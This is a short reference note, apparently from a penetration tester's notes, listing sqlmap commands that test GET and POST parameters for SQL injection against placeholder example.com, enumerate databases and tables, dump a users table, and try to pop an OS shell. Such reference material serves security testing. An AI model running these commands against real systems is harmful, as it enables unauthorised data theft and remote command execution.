---
tags:
  - tool
  - web
  - sql
  - injection
---
# sqlmap

Automatically test SQL injection

## Capabilities

```bash
# Test a GET request
sqlmap -u https://example.com?sqli_param=a --batch
sqlmap -u https://example.com?sqli_param=a --batch --dbs
sqlmap -u https://example.com?sqli_param=a -D example_database --tables
sqlmap -u https://example.com?sqli_param=a -D example_database -T example_users --dump

# Test a POST request with cookie
sqlmap --cookie 'key=value' -u https://example.com --method=POST --data 'safe_param=safe_value&sqli_param=a' -p sqli_param --batch
sqlmap --cookie 'key=value' -u https://example.com --method=POST --data 'safe_param=safe_value&sqli_param=a' -p sqli_param --batch --dbs
sqlmap --cookie 'key=value' -u https://example.com --method=POST --data 'safe_param=safe_value&sqli_param=a' -p sqli_param -D example_database --tables
sqlmap --cookie 'key=value' -u https://example.com --method=POST --data 'safe_param=safe_value&sqli_param=a' -p sqli_param -D example_database -T example_users --dump

# Specify param we are testing
sqlmap --cookie 'key=value' -u https://example.com --method=POST --data 'safe_param=safe_value&sqli_param=a' -p sqli_param --batch

# Attempt to pop a shell
sqlmap -u https://example.com?sqli_param=a --os-shell

# Attempt to pop a shell specifying the web root directory (must be writeable)
sqlmap -u https://example.com?sqli_param=a --os-shell --web-root '/bar/www/html/tmp'

# Test a request copied from burp
sqlmap -r post.req -p item --
```
